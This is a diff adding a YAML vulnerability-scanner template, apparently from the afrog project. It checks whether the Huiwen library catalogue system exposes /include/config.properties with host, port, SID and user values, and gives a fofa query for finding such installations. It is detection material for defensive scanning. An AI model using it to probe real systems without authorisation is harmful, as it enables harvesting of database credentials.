@@ -1,0 +1,31 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - host
+          - port=
+          - sid=
+          - user=
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/include/config.properties'
+id: huiwen-book-config-properties-info-leak
+info:
+  author: zan8in
+  description: |-
+    汇文 图书馆书目检索系统 /include/config.properties 文件中包含敏感信息，攻击者可以直接访问获取信息
+    fofa: app="汇文软件-书目检索系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞
+  severity: high
+  tags: huiwen,book,config-properties,info-leak,argus-import
